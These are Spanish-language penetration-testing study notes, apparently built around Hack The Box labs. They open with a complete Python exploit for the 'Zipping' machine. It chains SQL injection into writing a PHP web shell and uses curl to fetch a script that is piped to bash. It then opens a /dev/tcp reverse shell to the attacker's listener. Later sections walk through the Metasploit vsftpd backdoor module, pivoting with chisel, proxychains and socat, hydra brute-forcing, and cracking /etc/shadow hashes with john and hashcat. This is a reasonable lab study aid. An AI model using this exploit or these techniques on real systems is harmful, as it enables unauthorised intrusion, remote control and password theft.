# Identificar y modificar exploits

```
import requests
import sys
import subprocess
import random

if len(sys.argv) < 2:
	#AQUI HABRIA QUE CAMBIAR EL LISTENER IP Y EL LISTENER PORT
    print("Usage: python3 HTB_Zipping_poc.py <listener ip> <listener port>")
    sys.exit(1)

fnb = random.randint(10, 10000)
url = "http://zipping.htb/"

session = requests.Session()

print("[+] Please run nc in other terminal: rlwrap -cAr nc -nvlp " + f"{sys.argv[2]}")

print("[+] Write php shell /var/lib/mysql/rvsl" + str(fnb) + ".php")

with open('revshell.sh', 'w') as f:
        f.write("#!/bin/bash\n")
        f.write(f"bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1")
proc = subprocess.Popen(["python3", "-m", "http.server", "8000"])
phpshell = session.get(url + f"shop/index.php?page=product&id=%0A'%3bselect+'<%3fphp+system(\"curl+http%3a//{sys.argv[1]}:8000/revshell.sh|bash\")%3b%3f>'+into+outfile+'/var/lib/mysql/rvsl{fnb}.php'+%231")

print("[+] Get Reverse Shell")

phpshell = session.get(url + f"shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frvsl{fnb}")

proc.terminate()
```

# Realizar explotación con metasploit

![image](https://github.com/user-attachments/assets/99bc01b1-9d9e-4c20-abf0-b6862b05e4b0)

Después de hacer un nmap y haber visto las versiones de los servicios, podemos buscar a ver si hay exploits con searchsploit.
![image](https://github.com/user-attachments/assets/5d5254ed-46a3-44ae-893c-106d6b8d6da2)

También podemos hacer la búsqueda desde la msfconsole.
![image](https://github.com/user-attachments/assets/0e842828-5115-40c3-9419-2ac7de8b8b87)

Podemos buscar haber si hay algun exploit disponible  con search 
Podemos seleccionar el eploit con use 0, sino podemos hacer un use exploit/unix/ftp/vsftpd_234_backdoor
![image](https://github.com/user-attachments/assets/e9a88f42-07c3-4743-aeb5-791075080c02)

Con show options, podemos ver los parametros que necesita el exploit.
![image](https://github.com/user-attachments/assets/15394aee-2def-4658-809e-41a57796fad5)

Con set marcamos el rhosts y le ponemos la ip de la máquina victima.
Hacemos el primer exploit y vemos que no ha conseguido crear la session, pero hacemos run y ya coge la shell como root.

# Demostrar cómo pivotar agregando una ruta y reenviando puertos
![image](https://github.com/user-attachments/assets/a2466c9e-7e63-4828-83b7-ce971ad4acd7)

Creamos un servidor  con chisel para crear un tunel http entre la máquina victima y la mía.
![image](https://github.com/user-attachments/assets/17eac6bd-afe0-433f-9a95-a48b915f8601)

Nos conectamos como cliente desde la máquina victima a la máquina atacante.
![image](https://github.com/user-attachments/assets/12952c36-afad-4e1d-886f-74c943f342fc)

Podemos ver que se nos han conectado por el puerto 6565 y que se ha generado un proxy en el puerto 1080.
![image](https://github.com/user-attachments/assets/53006bbe-e569-4f5b-af83-bca58fe63769)

Añadimos está linea al final del todo del archivo /etc/proxychains4
![image](https://github.com/user-attachments/assets/aad2e1f7-1ca9-461d-adf2-b2880a9a1816)

Añadimos el proxy y ya podremos ver la página de la segunda máquina de la red. Pero para que estas máquinas puedan conectarse a nosotros necesitamos el socat.

![image](https://github.com/user-attachments/assets/9c40aac3-b8b3-4b3e-9218-4629868a6466)

Abrimos en la máquina victima 1 un escucha en el puerto 1111, y que lo reenvie a nuestra máquina atacante al puerto 448.

![image](https://github.com/user-attachments/assets/bfcc8164-0c59-4692-b32f-0c3d3b5bc27a)

En la máquina atacante abrimos la escucha en el puerto 448 con nc.
![image](https://github.com/user-attachments/assets/b58ae2fb-b890-4d33-84a1-6668ebaf51be)

Hacemos un revershell en la máquina victima 2.

![image](https://github.com/user-attachments/assets/8244188f-b6d2-424d-a27f-d96d7b652d37)

Y en la escucha que tenemos en el puerto 448 se nos abrirá la shell de la máquina 2.





# Realizar ataques de fuerza bruta a contraseñas y descifrado de hash

![image](https://github.com/user-attachments/assets/40123c1d-985d-45e8-9f8d-92ab442b1cab)
Para hacer ataques de fuerza bruta a contraseñas, podemos utilizar hydra:
-L marca el diccionario de usernames que se probarán
-p marca el diccionario de passwords que utilizará
Después marcamos la ip objetivo y el servicio que queremos atacar.
-s marcamos puerto específico

John the ripper:
Con esta herramienta podemos hacer ataques de fuerza bruta a hashes de contraseña.

Practica de ejemplo:
`unshadow /etc/passwd /etc/shadow > password.txt`
`john --wordlist=/path/to/dictionary password.txt`
`john --wordlist=/home/kali/contraas.txt  hash.txt --format=crypt ` "--format=crypt(sirve para yescrypt que es el hash de la pass de linux)"
`john --show password.txt`


Con john podemos adaptarnos a diferentes formatos de hash y tipos de archivos protegidos por contraseña. Existen unas herramientas que convierten estos archivos o hashes a un formato legible para john the ripper. Estas herramientas son programas conocidos como 2john. Ej:
zip2john -- rar2john -- pdf2john -- keepass2john...

Hashcat

Con esta herramienta también podemos hacer ataques de fuerza bruta a contraseñas.

Ejemplos de uso:

`hashcat -m 0 -a 0 hash.txt rockyou.txt`

Con -m especificamos el tipo de hash (MD5 en este caso)
-a especifica el modo de ataque (ataque de diccionario)
Primero se pone el archivo donde tenemos el hash a crackear y luego ponemos el diccionario 
